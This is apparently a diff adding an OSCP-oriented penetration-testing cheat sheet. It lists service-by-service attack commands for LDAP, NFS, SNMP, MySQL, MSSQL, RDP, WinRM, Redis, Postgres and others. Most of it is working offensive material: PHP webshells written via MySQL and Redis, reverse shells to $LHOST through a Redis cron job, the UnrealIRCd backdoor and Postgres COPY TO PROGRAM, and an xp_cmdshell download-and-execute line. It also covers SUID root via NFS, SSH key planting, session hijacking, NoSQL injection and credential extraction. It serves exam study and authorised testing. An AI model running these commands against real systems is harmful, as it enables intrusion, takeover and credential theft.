+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=computer)" name
+# All groups:
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=group)" name cn
+# Admin users:
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(adminCount=1)" sAMAccountName
+# Password policy:
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=domain)" pwdProperties
+# Users with SPN (Kerberoastable):
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+# AS-REP Roastable (no preauth):
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
+# Descriptions (often contain passwords!):
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" description sAMAccountName | grep -A1 "description:"
+
+# ── LDAPDOMAINDUMP ────────────────────────────────────────────
+ldapdomaindump -u "$DOMAIN\$AUTH_USER" -p "$AUTH_PASS" $IP -o loot/ldap/
+# Creates HTML/JSON/grep-able files of all objects
+
+# ── TIPS ──────────────────────────────────────────────────────
+# Port 3268 = Global Catalog (LDAP) — often more data
+# Port 3269 = Global Catalog over SSL
+# Always check description field — admins leave passwords here
+# Check for "password" in any attribute:
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" | grep -i pass
+</code></pre>
+</details>
+<details id="ref-4-8-nfs-port-2049">
+<summary>📂 4.8 NFS --- Port 2049</summary>
+<p><code>[LINUX:NFS] [PORT:2049]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── ENUMERATION ───────────────────────────────────────────────
+showmount -e $IP
+nmap --script nfs-ls,nfs-showmount,nfs-statfs -p2049 $IP
+rpcinfo -p $IP | grep nfs
+
+# ── MOUNT ─────────────────────────────────────────────────────
+mkdir /mnt/nfs
+mount -t nfs $IP:/share /mnt/nfs -o nolock
+mount -t nfs4 $IP:/share /mnt/nfs   # NFSv4
+ls -la /mnt/nfs                     # Check permissions
+
+# ── NO_ROOT_SQUASH EXPLOIT ────────────────────────────────────
+# Check /etc/exports on target (if readable):
+cat /etc/exports     # Look for no_root_squash
+# If present:
+cp /bin/bash /mnt/nfs/bash
+chmod +s /mnt/nfs/bash   # Set SUID
+# On target:
+/mnt/nfs/bash -p         # Gives root
+
+# Alternative — create SUID shell:
+# On attacker:
+cat &gt; /tmp/suid.c &lt;&lt; 'EOF'
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }
+EOF
+gcc /tmp/suid.c -o /mnt/nfs/suid
+chmod +s /mnt/nfs/suid
+# On target: /tmp/suid
+
+# ── UID IMPERSONATION ─────────────────────────────────────────
+# If files owned by UID 1001 and you can't read them:
+# Create user with same UID on your Kali:
+useradd -u 1001 tempuser
+su tempuser
+cat /mnt/nfs/sensitive_file
+</code></pre>
+</details>
+<details id="ref-4-9-rpc-ports-111-135">
+<summary>🔌 4.9 RPC --- Ports 111, 135</summary>
+<p><code>[PORT:111] [PORT:135] [SERVICE:RPC]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── RPCBIND (111) ─────────────────────────────────────────────
+rpcinfo -p $IP
+nmap --script rpcinfo -p111 $IP
+
+# ── RPCCLIENT (135) ───────────────────────────────────────────
+rpcclient -U "" -N $IP         # Null session
+rpcclient -U "$AUTH_USER" "$IP"  # password prompt
+
+# Useful rpcclient commands:
+rpcclient&gt; srvinfo               # Server info
+rpcclient&gt; enumdomains           # List domains
+rpcclient&gt; querydominfo          # Domain info
+rpcclient&gt; enumdomusers          # List users
+rpcclient&gt; enumdomgroups         # List groups
+rpcclient&gt; queryuser 0x1f4       # User details (RID in hex)
+rpcclient&gt; getdompwinfo          # Password policy
+rpcclient&gt; enumalsgroups domain  # Alias groups
+rpcclient&gt; lookupnames user      # Get SID for user
+rpcclient&gt; lookupsids S-1-5-21-xxx-xxx-xxx-1000   # Get username for SID
+
+# ── RID CYCLING (enumerate users) ─────────────────────────────
+for i in $(seq 500 1200); do
+  rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2&gt;/dev/null | grep -i "user name"
+done
+# Or with nxc:
+nxc smb $IP -u '' -p '' --rid-brute
+
+
+# ── MSRPC SPECIFIC ATTACKS ────────────────────────────────────
+# PrintNightmare check:
+nmap --script msrpc-enum $IP
+impacket-rpcdump $IP | grep -i print
+</code></pre>
+</details>
+<details id="ref-4-10-snmp-port-161-udp">
+<summary>📡 4.10 SNMP --- Port 161 UDP</summary>
+<p><code>[PORT:161] [SERVICE:SNMP]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── COMMUNITY STRING BRUTEFORCE ───────────────────────────────
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
+onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt $IP
+# Or with nmap:
+nmap -sU -p161 --script snmp-brute $IP
+
+# ── SNMPWALK (dump everything) ────────────────────────────────
+snmpwalk -c public -v1 $IP &gt; scans/snmp/full.txt 2&gt;/dev/null
+snmpwalk -c public -v2c $IP &gt; scans/snmp/full_v2.txt 2&gt;/dev/null
+
+# ── TARGETED OID QUERIES ──────────────────────────────────────
+# Running processes (GOLD MINE — reveals service names/paths/args):
+snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2
+# Process command lines (even better — may show passwords in args!):
+snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.5
+# Installed software:
+snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2
+# Network interfaces:
+snmpwalk -c public -v1 $IP 1.3.6.1.2.1.2.2.1
+# Open TCP ports:
+snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3
+# User accounts:
+snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25
+# System info:
+snmpwalk -c public -v1 $IP 1.3.6.1.2.1.1
+
+# ── SNMP-CHECK ────────────────────────────────────────────────
+snmp-check $IP -c public -v 1
+snmp-check $IP -c public -v 2c
+
+# ── SNMPSET (write, if writable community) ────────────────────
+snmpset -c private -v1 $IP 1.3.6.1.2.1.1.6.0 s "pwned"
+
+# ── SNMP TO SHELL (if Net-SNMP with extend) ───────────────────
+# If extend functionality enabled:
+snmpwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+
+# ── TIPS ──────────────────────────────────────────────────────
+# Process args often leak: passwords, connection strings, API keys
+# Windows SNMP leaks usernames, shares, services, software list
+# SNMPv3 auth: snmpwalk -v3 -l authPriv -u user -a SHA -A authpass -x AES -X privpass $IP
+</code></pre>
+</details>
+<details id="ref-4-11-mysql-port-3306">
+<summary>🗄️ 4.11 MySQL --- Port 3306</summary>
+<p><code>[PORT:3306] [SERVICE:MYSQL]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── CONNECT ───────────────────────────────────────────────────
+mysql -h $IP -u root -p
+mysql -h $IP -u root --password=''
+mysql -h $IP -u root --password=root
+mysql -h $IP -u '' --password=''     # Anonymous
+
+# ── ENUMERATION ───────────────────────────────────────────────
+SHOW databases;
+USE mysql;
+SHOW tables;
+SELECT * FROM user;                  # Username + password hashes
+SELECT user, host, authentication_string FROM mysql.user;
+SELECT @@hostname, @@datadir, @@version, @@global.secure_file_priv;
+SHOW variables LIKE 'secure_file_priv';  # Empty = can read/write anywhere!
+
+# ── FILE READ ─────────────────────────────────────────────────
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('/root/.ssh/id_rsa');
+SELECT LOAD_FILE('/var/www/html/config.php');
+
+# ── FILE WRITE → WEBSHELL ─────────────────────────────────────
+SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/html/shell.php';
+SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO DUMPFILE '/var/www/html/shell.php';
+-- Need: FILE privilege + secure_file_priv = '' + write access to path
+
+# ── UDF PRIVILEGE ESCALATION ──────────────────────────────────
+# If running as root + plugin_dir writable:
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/tmp/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('id &gt; /tmp/out; chown user /tmp/out');
+
+# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
+# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
+SHORTLIST=notes/password-shortlist.txt
+test -s "$SHORTLIST" &amp;&amp; hydra -l root -P "$SHORTLIST" $IP mysql -t 2
+
+# ── NMAP SCRIPTS ──────────────────────────────────────────────
+nmap --script mysql-info,mysql-databases,mysql-users,mysql-empty-password -p3306 $IP
+</code></pre>
+</details>
+<details id="ref-4-12-mssql-port-1433">
+<summary>🗄️ 4.12 MSSQL --- Port 1433</summary>
+<p><code>[PORT:1433] [SERVICE:MSSQL]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── CONNECT ───────────────────────────────────────────────────
+impacket-mssqlclient domain/user@$IP
+impacket-mssqlclient user@$IP -windows-auth     # Windows auth
+impacket-mssqlclient user@$IP -port 1433
+
+# ── ENUMERATION ───────────────────────────────────────────────
+SELECT @@version;
+SELECT name FROM sys.databases;
+SELECT name FROM sys.tables;
+SELECT name FROM master.dbo.sysdatabases;
+SELECT srvname, isremote FROM sysservers;     # Linked servers!
+SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+EXEC xp_msver;                                # Server info
+
+# ── XP_CMDSHELL → RCE ─────────────────────────────────────────
+-- Enable (need sysadmin):
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://LHOST/shell.ps1'')"';
+
+-- If can't enable directly:
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+DECLARE @shell INT;
+EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
+EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami &gt; C:\output.txt', 0, TRUE;
+
+# ── LINKED SERVER ATTACK ──────────────────────────────────────
+EXEC ('SELECT @@version') AT [linkedserver];
+EXEC ('EXEC xp_cmdshell ''whoami''') AT [linkedserver];
+
+# ── FILE READ ─────────────────────────────────────────────────
+CREATE TABLE t (content NVARCHAR(4000));
+BULK INSERT t FROM 'c:\windows\win.ini' WITH (ROWTERMINATOR = '\n');
+SELECT * FROM t;
+
+# Forced-authentication / poisoning workflow intentionally omitted.
+
+# ── NMAP + CME ────────────────────────────────────────────────
+nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p1433 $IP
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -q "SELECT @@version"
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" --local-auth -q "EXEC xp_cmdshell 'whoami'"
+</code></pre>
+</details>
+<details id="ref-4-13-rdp-port-3389">
+<summary>🖥️ 4.13 RDP --- Port 3389</summary>
+<p><code>[PORT:3389] [SERVICE:RDP]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── FINGERPRINT ───────────────────────────────────────────────
+nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 $IP -p3389
+nmap --script rdp-enum-encryption -p3389 $IP
+
+# ── CONNECT ───────────────────────────────────────────────────
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP +clipboard              # Enable clipboard
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP /drive:kali,/tmp        # Mount /tmp as share
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP /dynamic-resolution /cert-ignore
+xfreerdp /u:Administrator /pth:NTLMHASH /v:$IP          # Pass-the-hash!
+rdesktop -u "$AUTH_USER" $IP -g 1280x720
+rdesktop -u "$AUTH_USER" $IP -r disk:share=/tmp         # Mount share
+
+# ── PASS-THE-HASH RDP ─────────────────────────────────────────
+# Requires: Restricted Admin Mode enabled on target
+# STATE CHANGE: first record the current value and write the rollback command.
+reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
+# Enable only if the proven path requires it and you have local admin:
+reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
+xfreerdp /u:Administrator /pth:NTLMHASH /v:$IP
+
+# ── CVEs ──────────────────────────────────────────────────────
+# BlueKeep (CVE-2019-0708) - Pre-auth RCE - Windows 7/2008R2/2003/XP
+nmap --script rdp-vuln-ms12-020 $IP
+# MSF ONE-TARGET LOCK — only after choosing this target: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+# DejaBlue (CVE-2019-1181/1182) - Windows 8+/2012+
+
+# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
+# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
+SHORTLIST=notes/password-shortlist.txt
+test -s "$SHORTLIST" &amp;&amp; hydra -l administrator -P "$SHORTLIST" rdp://$IP -t 1 -f
+test -s "$SHORTLIST" &amp;&amp; crowbar -b rdp -s $IP/32 -u user -C "$SHORTLIST" -n 1
+
+# ── SCREENSHOTTING (if RDP session alive but locked) ──────────
+# If you have code exec but no interactive:
+tscon 1 /dest:console   # Hijack another user's session!
+# List sessions: query user OR qwinsta
+</code></pre>
+</details>
+<details id="ref-4-14-winrm-ports-5985-5986">
+<summary>🔧 4.14 WinRM --- Ports 5985, 5986</summary>
+<p><code>[PORT:5985] [PORT:5986] [SERVICE:WINRM]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── CHECK IF ACCESSIBLE ───────────────────────────────────────
+nmap -p5985,5986 $IP
+nxc winrm $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+
+# ── EVIL-WINRM (best tool) ────────────────────────────────────
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+evil-winrm -i $IP -u user -H NTLMHASH          # PtH
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS" -S            # SSL (port 5986)
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS" \
+  -e /path/to/executables \     # Upload and exec
+  -s /path/to/ps1-scripts       # Load PS1 scripts in session
+
+# Inside evil-winrm:
+# upload /local/file C:\remote\file
+# download C:\remote\file /local/file
+# Invoke-Binary /path/to/binary   (bypass AV)
+# menu    → shows available commands
+
+# ── SSL WINRM (5986) ──────────────────────────────────────────
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS" -S -P 5986
+# Or with cert:
+evil-winrm -i $IP -c cert.pem -k key.pem -S
+</code></pre>
+</details>
+<details id="ref-4-15-redis-port-6379">
+<summary>! 4.15 Redis --- Port 6379</summary>
+<p><code>[PORT:6379] [SERVICE:REDIS]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── UNAUTHENTICATED ACCESS ────────────────────────────────────
+redis-cli RCE : https://github.com/Ridter/redis-rce/pull/5/changes/be45d113ebcfef407bb1fba8b574c36daa4a2bb9#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5
+redis-cli -h $IP ping          # PONG = accessible
+redis-cli -h $IP
+&gt; info server                   # Version + OS
+&gt; config get *                  # All config settings
+&gt; keys *                        # List all keys
+&gt; get key_name                  # Get key value
+&gt; dbsize                        # Count of keys
+
+# ── WITH AUTH ─────────────────────────────────────────────────
+redis-cli -h $IP -a password
+redis-cli -h $IP
+&gt; AUTH password
+
+# ── WEBSHELL VIA REDIS ────────────────────────────────────────
+redis-cli -h $IP
+&gt; config set dir /var/www/html
+&gt; config set dbfilename shell.php
+&gt; set pwn "&lt;?php system($_GET['cmd']); ?&gt;"
+&gt; save
+# → Access: http://$IP/shell.php?cmd=id
+
+# ── SSH KEY VIA REDIS ─────────────────────────────────────────
+ssh-keygen -t rsa -f /tmp/redis_key -N ""
+(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") &gt; /tmp/spaced.txt
+# MUTATION GATE: record CONFIG GET dir/dbfilename and preserve the destination first.
+redis-cli -h $IP config get dir
+redis-cli -h $IP config get dbfilename
+redis-cli -h $IP -x set pwn &lt; /tmp/spaced.txt
+redis-cli -h $IP config set dir /root/.ssh/
+redis-cli -h $IP config set dbfilename authorized_keys
+redis-cli -h $IP save
+ssh -i /tmp/redis_key root@$IP
+
+# ── REDIS CRON JOB RCE — DESTRUCTIVE LAST RESORT ─────────────
+# This can overwrite a privileged crontab. Back it up and write rollback first.
+redis-cli -h $IP config set dir /var/spool/cron/
+redis-cli -h $IP config set dbfilename root
+redis-cli -h $IP set pwn "\n\n* * * * * bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1\n\n"
+redis-cli -h $IP save
+
+# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
+SHORTLIST=notes/password-shortlist.txt
+test -s "$SHORTLIST" &amp;&amp; hydra -P "$SHORTLIST" redis://$IP -t 1 -f
+</code></pre>
+</details>
+<details id="ref-4-16-oracle-tns-port-1521">
+<summary>🔶 4.16 Oracle TNS --- Port 1521</summary>
+<p><code>[PORT:1521] [SERVICE:ORACLE]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── LISTENER / VERSION FIRST ─────────────────────────────────
+nmap --script oracle-tns-version -p1521 $IP
+tnscmd10g version -h $IP
+tnscmd10g status -h $IP
+
+# ── SERVICE NAME / SID ────────────────────────────────────────
+# Prefer names learned from app config, errors, files or listener output.
+# If still unknown, use ONE focused discovery method and stop when you have a candidate:
+odat sidguesser -s $IP -p 1521
+
+# ── AUTH — KEEP PASSWORD OUT OF THE COMMAND LINE ─────────────
+# SQL*Plus prompts for the password. Replace SID/SERVICE only after discovery.
+sqlplus -L user@//$IP:1521/SID
+
+# ── AFTER AUTH ────────────────────────────────────────────────
+# Record user/roles/version, then choose ONE exact ODAT/SQL path supported by evidence.
+# Do NOT run `odat all` by default. Do NOT start broad password guessing.
+# Check the installed syntax before an exact module:
+odat --help
+
+# Decision path:
+# listener/version → SID/service → justified credential → DB role/privileges
+# → exact prerequisite-backed module only if it advances the target
+</code></pre>
+</details>
+<details id="ref-4-17-mongodb-port-27017">
+<summary>🍃 4.17 MongoDB --- Port 27017</summary>
+<p><code>[PORT:27017] [SERVICE:MONGODB]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── CONNECT ───────────────────────────────────────────────────
+mongo $IP
+mongo $IP:27017
+mongo $IP/admin -u "$AUTH_USER" -p  # password prompt
+
+# ── ENUMERATION ───────────────────────────────────────────────
+&gt; show dbs
+&gt; use admin
+&gt; db.getUsers()
+&gt; db.runCommand({connectionStatus:1})
+&gt; db.adminCommand({listDatabases:1})
+&gt; show collections
+&gt; db.collection.find()
+&gt; db.collection.find().pretty()
+
+# ── NOSQL INJECTION ───────────────────────────────────────────
+# In web forms that use MongoDB backend:
+username[$ne]=invalid&amp;password[$ne]=invalid   # Not-equal bypass
+username=admin&amp;password[$regex]=.*            # Regex bypass
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+# Mongo Injection payloads:
+username=admin'%20||%20'1'=='1'&amp;password=x
+</code></pre>
+</details>
+<details id="ref-4-18-vnc-ports-5900-5909">
+<summary>🖥️ 4.18 VNC --- Ports 5900-5909</summary>
+<p><code>[PORT:5900] [SERVICE:VNC]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── FINGERPRINT ───────────────────────────────────────────────
+nmap -sV -p5900 $IP
+nmap -Pn -n --script vnc-info -p5900 $IP
+
+# ── CONNECT ───────────────────────────────────────────────────
+vncviewer $IP
+vncviewer $IP:1           # Display 1
+vncviewer $IP::5901       # Explicit port
+
+# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
+# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
+SHORTLIST=notes/password-shortlist.txt
+test -s "$SHORTLIST" &amp;&amp; hydra -P "$SHORTLIST" $IP vnc -t 1
+test -s "$SHORTLIST" &amp;&amp; medusa -h $IP -P "$SHORTLIST" -M vnc -t 1
+
+# ── DECRYPT SAVED VNC PASSWORD ────────────────────────────────
+# Found .vnc config or registry entry
+# Decrypt (uses fixed 3DES key):
+python3 -c "
+import base64; from Crypto.Cipher import DES3
+enc = bytes.fromhex('HEXPASSWORD')
+key = b'\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0'
+print(DES3.new(key, DES3.MODE_ECB).decrypt(enc).rstrip(b'\x00'))"
+# Or use: vncpwd / vncpasswd tool
+</code></pre>
+</details>
+<details id="ref-4-19-other-notable-services">
+<summary>📞 4.19 Other Notable Services</summary>
+<pre class="ref-code"><code class="language-bash"># ── TELNET (23) ───────────────────────────────────────────────
+telnet $IP 23
+# Test only a justified default/known credential manually; do not spray by default.
+nmap -Pn -n -sV --script telnet-encryption -p23 $IP
+
+# ── POP3 (110) ───────────────────────────────────────────────
+nc -nv $IP 110
+USER admin
+PASS password
+LIST           # List emails
+RETR 1         # Read email 1
+
+# ── IMAP (143) ────────────────────────────────────────────────
+nc -nv $IP 143
+a LOGIN user password
+a LIST "" "*"
+a SELECT INBOX
+a FETCH 1 BODY[]
+
+# ── IRC (6667) ────────────────────────────────────────────────
+nmap --script irc-botnet-channels,irc-info -p6667 $IP
+# UnrealIRCd backdoor (CVE-2010-2075)
+nc -nv $IP 6667
+AB; bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1
+
+# ── RSYNC (873) ───────────────────────────────────────────────
+rsync rsync://$IP/                    # List modules
+rsync rsync://$IP/share               # List share contents
+# ONLY when one exact artifact is necessary to compromise the target:
+# rsync rsync://$IP/share/path/NECESSARY_FILE loot/necessary/
+rsync /tmp/shell "rsync://$IP/share/"  # Upload only after proving the module is writable
+# Do not recursively mirror a module to Kali; delete any necessary local copy after the objective.
+
+# ── CUPS (631) ────────────────────────────────────────────────
+# Printing service — often on Linux
+curl http://$IP:631/
+nmap --script cups-info -p631 $IP
+
+# ── DOCKER API (2375, 2376) ───────────────────────────────────
+curl http://$IP:2375/version
+curl http://$IP:2375/containers/json
+docker -H tcp://$IP:2375 ps
+docker -H tcp://$IP:2375 run -v /:/mnt -it alpine chroot /mnt sh
+
+# ── KUBERNETES API (6443, 8443, 8080) ─────────────────────────
+curl https://$IP:6443/api/v1 -k
+kubectl --server=https://$IP:6443 get pods --all-namespaces
+
+# ── ELASTICSEARCH (9200) ──────────────────────────────────────
+curl http://$IP:9200/
+curl http://$IP:9200/_cat/indices
+curl http://$IP:9200/index/_search?pretty
+
+# ── CASSANDRA (9042) ──────────────────────────────────────────
+nmap --script cassandra-info -p9042 $IP
+
+# ── POSTGRES (5432) ───────────────────────────────────────────
+psql -h $IP -U postgres
+psql -h $IP -U postgres -c "\l"      # List databases
+psql -h $IP -U postgres -c "SELECT pg_read_file('/etc/passwd')"
+psql -h $IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'id'"
+# RCE via COPY TO PROGRAM:
+psql -h $IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'''"
+
+# ── KERBEROS (88) ─────────────────────────────────────────────
+# See Active Directory section for full Kerb attacks
+nmap --script krb5-enum-users --script-args krb5-enum-users.realm=domain.com -p88 $IP
+# Prefer a small evidence-derived list; avoid mega-list enumeration by default.
+kerbrute userenum -d domain.com users.txt --dc $IP -o valid_users.txt
+</code></pre>
+</details>
+<hr/>
+<h2 id="ref-5-vulnerability-identification">5. VULNERABILITY IDENTIFICATION</h2>
+<details id="ref-5-1-searchsploit-master-workflow">
+<summary>🔎 5.1 Searchsploit --- Master Workflow</summary>
+<pre class="ref-code"><code class="language-bash"># ── BASIC SEARCH ──────────────────────────────────────────────
+searchsploit apache 2.4.49
+searchsploit openssh 7.2
+searchsploit "windows 7" "privilege escalation"
+searchsploit -t "Remote" "Buffer Overflow"    # Title search
+
+# ── FLAGS ─────────────────────────────────────────────────────
+searchsploit -x 12345          # Examine (read without copying)
+searchsploit -m 12345          # Mirror (copy to current dir)
+searchsploit -w 12345          # Show web URL
+searchsploit --update          # Update database
+searchsploit -p 12345          # Full path
+
+# ── SEARCH FROM NMAP OUTPUT ───────────────────────────────────
+searchsploit --nmap scans/nmap/targeted.xml
+
+# ── FIX EXPLOITS (common issues) ──────────────────────────────
+# Change LHOST/LPORT/RHOST in exploit:
+sed -i 's/LHOST/$LHOST/g' exploit.py
+# Python2 → Python3:
+2to3 exploit.py -w
+# Check imports, fix urllib issues:
+# urllib.request, urllib.parse instead of urllib in Py3
+
+# ── COMPILE C EXPLOITS ────────────────────────────────────────
+gcc exploit.c -o exploit
+gcc exploit.c -o exploit -m32                          # 32-bit
+gcc exploit.c -o exploit -pthread -lcrypt              # With libs
+gcc exploit.c -o exploit -lpthread                     # Pthread
+# Cross-compile for Windows:
+i686-w64-mingw32-gcc exploit.c -o exploit.exe          # 32-bit Windows
+x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe      # 64-bit Windows
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 # With winsock
+
+# ── EXPLOIT MODIFICATION CHECKLIST ───────────────────────────
+# Before running ANY exploit:
+# 1. Read the code — understand what it does
+# 2. Check: does it need a listener? what port?
+# 3. Update IP, port, path variables
+# 4. Check Python version requirements
+# 5. Check library dependencies (pip install X)
+# 6. Test on local machine if possible
+# 7. Note any destructive operations (rm, format, crash)
+</code></pre>
+</details>
+<details id="ref-5-2-metasploit-smart-usage-for-oscp">
+<summary>🎯 5.2 Metasploit --- Smart Usage for OSCP</summary>
+<blockquote>
+<p>⚠️ <strong>EXAM-RESTRICTED</strong> · <code>[REQ:ONE_SELECTED_TARGET]</code> · <code>check</code> commits the selected target · never use Metasploit for pivoting.</p>
+</blockquote>
+<pre class="ref-code"><code class="language-bash"># ── SETUP ─────────────────────────────────────────────────────
+msfconsole -q                          # Quiet start
+msf&gt; workspace -a $IP
+msf&gt; db_import scans/nmap/targeted.xml  # Import saved Nmap XML after choosing the MSF target
+
+# ── SEARCH ────────────────────────────────────────────────────
+msf&gt; search type:exploit platform:windows ms17-010
+msf&gt; search cve:2021-41773
+msf&gt; search name:eternalblue
+
+# ── USE WITHOUT METERPRETER (for OSCP — use shell payloads!) ──
+msf&gt; use exploit/windows/smb/ms17_010_eternalblue
+msf&gt; set PAYLOAD windows/x64/shell_reverse_tcp   # NOT meterpreter
+msf&gt; set RHOSTS $IP
+msf&gt; set LHOST $LHOST
+msf&gt; set LPORT $LPORT
+msf&gt; run
+
+# ── AUXILIARY MODULES — THESE *DO* COUNT TOWARD THE ONE-TARGET LIMIT ──
+msf&gt; use auxiliary/scanner/smb/smb_ms17_010   # Just scanning
+msf&gt; use auxiliary/scanner/ssh/ssh_enumusers
+msf&gt; use auxiliary/scanner/mssql/mssql_login
+
+# troubleshooting
+# if you are not able to use exploit and error is saying ambiguos; try _reload_all_ command in msf shell.
+# if after executing _run_ command you are getting unable to load package, then try _msfdb reinit_ in root shell
+
+# ── TIPS ──────────────────────────────────────────────────────
+# OSCP RULE: Auxiliary/Exploit/Post modules and Meterpreter are limited to ONE target.
+# Even using a module's `check` on a target locks Metasploit usage to that target.
+# Metasploit cannot be used for pivoting.
+# msfvenom and exploit/multi/handler may be used against all targets;
+# Meterpreter payload use is still restricted to the one selected target.
+# Use Nmap/manual tools for scanning other targets and record which target is MSF-locked.
+</code></pre>
+</details>
+<hr/>
+<details id="ref-5-x-2026-cve-triage-methodology-do-not-exploit-by-version-alone">
+<summary>➜ 5.x 2026 CVE Triage Methodology --- Do Not Exploit by Version Alone</summary>
+<pre class="ref-code"><code class="language-text">EXACT PRODUCT
+      ↓
+EXACT VERSION / BUILD / PACKAGE REVISION
+      ↓
+VENDOR ADVISORY
+      ↓
+NVD / SECURITY TRACKER
+      ↓
+LOCAL OR REMOTE?
+      ↓
+AUTHENTICATION / PRIVILEGE REQUIRED?
+      ↓
+CONFIGURATION / MODULE / DRIVER PREREQUISITES
+      ↓
+MITIGATIONS / PATCH BACKPORTS
+      ↓
+PUBLIC PoC / REPRODUCER
+      ↓
+SOURCE + PREREQUISITE REVIEW
+      ↓
+TARGET
+</code></pre>
+<p>For every candidate CVE record:</p>
+<ul>
+<li>[ ] CVE ID</li>
+<li>[ ] Product/component</li>
+<li>[ ] Affected versions/builds</li>
+<li>[ ] Local/remote/authenticated</li>
+<li>[ ] Required privileges</li>
+<li>[ ] Required configuration/module/service</li>
+<li>[ ] Architecture</li>
+<li>[ ] Mitigations</li>
+<li>[ ] Public PoC/reproducer</li>
+<li>[ ] Reliability</li>
+<li>[ ] Detection/validation command</li>
+<li>[ ] Primary reference</li>
+</ul>
+<p><strong>Important:</strong> distro vendors frequently backport security fixes without
+changing the upstream-looking version string. Always check the distro
+package revision/security tracker before declaring a target vulnerable.</p>
+<p>Primary references:</p>
+<ul>
+<li>NVD: https://nvd.nist.gov/</li>
+<li>Microsoft MSRC: https://msrc.microsoft.com/</li>
+<li>Ubuntu Security: https://ubuntu.com/security/notices</li>
+<li>Debian Security Tracker: https://security-tracker.debian.org/</li>
+<li>Exploit-DB: https://www.exploit-db.com/</li>
+</ul>
+</details>
+<hr/>
